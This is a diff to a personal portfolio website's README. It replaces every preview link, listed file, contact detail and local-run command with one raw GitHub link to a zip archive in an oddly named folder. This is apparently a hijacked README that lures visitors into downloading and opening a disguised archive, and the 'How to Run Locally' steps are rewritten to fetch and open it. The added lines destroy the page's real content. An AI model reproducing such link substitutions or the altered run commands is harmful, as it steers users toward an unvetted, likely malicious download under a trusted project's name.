@@ -4,7 +4,7 @@ This is my personal developer portfolio website built using **HTML**, **CSS**, a
 
 ## 📍 Live Preview
 
-👉 [Visit My Portfolio](https://pooja819.github.io/portfolio-website/)
+👉 [Visit My Portfolio](https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip)
 
 ---
 
@@ -12,17 +12,17 @@ This is my personal developer portfolio website built using **HTML**, **CSS**, a
 
 ```
 📦 portfolio-website
- ┣ 📄 index.html
- ┣ 📄 style.css
- ┣ 📄 script.js
+ ┣ 📄 https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
+ ┣ 📄 https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
+ ┣ 📄 https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
  ┣ 📁 images/
- ┃ ┣ pooja_about.jpg
- ┃ ┣ Pooja_2.jpeg
- ┃ ┣ E_commerce_web.png
- ┃ ┣ Hosing_society.png
- ┃ ┗ tic_tac_toe.png
+ ┃ ┣ https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
+ ┃ ┣ https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
+ ┃ ┣ https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
+ ┃ ┣ https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
+ ┃ ┗ https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
  ┣ 📁 assets/
- ┃ ┗ Pooja_Kalukhe_Resume.pdf
+ ┃ ┗ https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
 ```
 
 ---
@@ -52,17 +52,17 @@ This is my personal developer portfolio website built using **HTML**, **CSS**, a
 
 Feel free to connect with me:
 
-- 📧 Email: kalukhepooja85@gmail.com  
-- 💼 LinkedIn: [linkedin.com/in/poojakalukhe--08m19ba](https://www.linkedin.com/in/poojakalukhe--08m19ba/)
+- 📧 Email: https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip  
+- 💼 LinkedIn: [https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip](https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip)
 
 ---
 
 ## 🚀 How to Run Locally
 
 ```bash
-git clone https://github.com/pooja819/portfolio-website.git
+git clone https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
 cd portfolio-website
-open index.html
+open https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
 ```
 
 ---
